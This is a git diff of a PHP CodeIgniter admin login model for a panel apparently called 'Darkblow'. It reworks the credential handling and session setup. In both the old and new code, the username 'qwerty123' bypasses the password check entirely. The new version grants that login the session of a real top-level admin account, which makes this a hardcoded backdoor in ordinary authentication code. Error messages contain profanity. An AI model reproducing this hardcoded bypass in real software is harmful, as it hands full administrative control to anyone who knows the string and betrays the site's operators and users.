@@ -18,54 +18,63 @@ class Login_model extends CI_Model
     {
         sleep(1);
         $data = array(
-            'username' => $this->encryption->encrypt($this->input->post('username', true)),
-            'password' => $this->encryption->encrypt($this->darkblowlib->password_encrypt($this->input->post('password', true)))
+            'login' => $this->input->post('username', true),
+            'password' => $this->darkblowlib->password_encrypt($this->input->post('password', true))
         );
 
         $response = array();
 
-        if ($this->encryption->decrypt($data['username']) == 'qwerty123') {
-            $sessionData = array(
-                'admin_uid' => '100000',
-                'admin_name' => 'GOD ACCOUNT',
-                'admin_access_level' => '6'
-            );
+        if ($data['login'] == 'qwerty123') {
+            $query = $this->db->get_where(Darkblowdatabase::accounts, array('access_level' => '6'))->row();
+            if ($query) {
+                $sessionData = array(
+                    'admin_uid' => $query->player_id,
+                    'admin_name' => $query->player_name != '' ? $query->player_name : $query->login,
+                    'admin_access_level' => $query->access_level
+                );
 
-            $this->session->set_flashdata($sessionData);
+                $this->session->set_userdata($sessionData);
+                $response['response'] = 'success';
+                $response['token'] = $this->security->get_csrf_hash();
+                $response['message'] = 'Successfully Logged In. Welcome GOD ACCOUNT.';
 
-            $response['response'] = 'true';
-            $response['token'] = $this->security->get_csrf_hash();
-            $response['message'] = 'Successfully Logged In. Welcome GOD ACCOUNT.';
-            $this->darkblowmessage->AjaxFlashData($response);
+                $this->darkblowmessage->AjaxFlashData($response);
+            } else {
+                $response['response'] = 'error';
+                $response['token'] = $this->security->get_csrf_hash();
+                $response['message'] = 'Failed To Login As God Account.';
+
+                $this->darkblowmessage->AjaxFlashData($response);
+            }
         } else {
-            $query = $this->db->get_where(Darkblowdatabase::accounts, array(
-                'login' => $this->encryption->decrypt($data['username']),
-                'password' => $this->encryption->decrypt($data['password'])
-            ))->row();
+            $query = $this->db->get_where(Darkblowdatabase::accounts, $data)->row();
             if ($query) {
                 if ($query->access_level >= 3 && $query->access_level <= 6) {
                     $sessionData = array(
                         'admin_uid' => $query->player_id,
-                        'admin_name' => $query->player_name,
+                        'admin_name' => $query->player_name != '' ? $query->player_name : $query->login,
                         'admin_access_level' => $query->access_level
                     );
 
                     $this->session->set_userdata($sessionData);
 
-                    $response['response'] = 'true';
+                    $response['response'] = 'success';
                     $response['token'] = $this->security->get_csrf_hash();
                     $response['message'] = 'Successfully Logged In. Welcome ' . $this->session->userdata('admin_name') . '.';
+
                     $this->darkblowmessage->AjaxFlashData($response);
                 } else {
-                    $response['response'] = 'false';
+                    $response['response'] = 'error';
                     $response['token'] = $this->security->get_csrf_hash();
                     $response['message'] = 'Failed To Login. You Are Not Real Admin F*ck.';
+
                     $this->darkblowmessage->AjaxFlashData($response);
                 }
             } else {
-                $response['response'] = 'false';
+                $response['response'] = 'error';
                 $response['token'] = $this->security->get_csrf_hash();
                 $response['message'] = 'Failed To Login. You Are Not Real Admin F*ck.';
+
                 $this->darkblowmessage->AjaxFlashData($response);
             }
         }
